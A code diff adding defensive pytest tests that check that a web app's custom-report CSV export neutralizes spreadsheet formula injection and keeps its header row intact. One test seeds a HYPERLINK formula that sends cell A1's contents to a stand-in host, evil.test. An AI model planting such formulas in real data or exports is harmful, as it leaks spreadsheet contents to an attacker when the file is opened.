@@ -276,3 +276,45 @@ def test_custom_report_export_csv_excludes_other_tenant_rows(client: TestClient,
     numbers = {row["work_order_number"] for row in reader}
     assert wo_a.work_order_number in numbers, "company A's WO must be in its own export"
     assert wo_b.work_order_number not in numbers, "company B's WO must NOT be in company A's export"
+
+
+# ---------------------------------------------------------------------------
+# Spreadsheet formula injection in the custom-report CSV export (CWE-1236).
+# ---------------------------------------------------------------------------
+
+
+def test_custom_report_export_csv_neutralizes_formula_injection(client: TestClient, db_session: Session):
+    """A work-order number that looks like a formula must not execute when the
+    exported CSV is opened in Excel: it is emitted with a leading single quote,
+    while ordinary rows are untouched."""
+    a_user = make_user(db_session, company_id=COMPANY_A)
+    payload = '=HYPERLINK("http://evil.test/?d="&A1,"CLICK")'
+    make_work_order(db_session, company_id=COMPANY_A, wo_number=payload)
+    make_work_order(db_session, company_id=COMPANY_A, wo_number="CRPT-A-0006")
+    template = _make_wo_template(db_session, company_id=COMPANY_A, created_by=a_user.id)
+
+    resp = client.get(
+        f"/api/v1/analytics/custom-report/export?template_id={template.id}&format=csv",
+        headers=headers_for(a_user),
+    )
+    assert resp.status_code == status.HTTP_200_OK, resp.text
+
+    numbers = {row["work_order_number"] for row in csv.DictReader(io.StringIO(resp.text))}
+    assert "'" + payload in numbers, "the formula payload must be neutralized with a leading quote"
+    assert payload not in numbers, "an un-prefixed formula cell must never be emitted"
+    assert "CRPT-A-0006" in numbers, "ordinary rows must pass through unchanged"
+
+
+def test_custom_report_export_csv_header_row_is_intact(client: TestClient, db_session: Session):
+    """Neutralization must not disturb ordinary column headers -- DictReader keys
+    have to keep matching the template's field names."""
+    a_user = make_user(db_session, company_id=COMPANY_A)
+    make_work_order(db_session, company_id=COMPANY_A, wo_number="CRPT-A-0007")
+    template = _make_wo_template(db_session, company_id=COMPANY_A, created_by=a_user.id)
+
+    resp = client.get(
+        f"/api/v1/analytics/custom-report/export?template_id={template.id}&format=csv",
+        headers=headers_for(a_user),
+    )
+    assert resp.status_code == status.HTTP_200_OK, resp.text
+    assert resp.text.splitlines()[0] == "work_order_number,status"
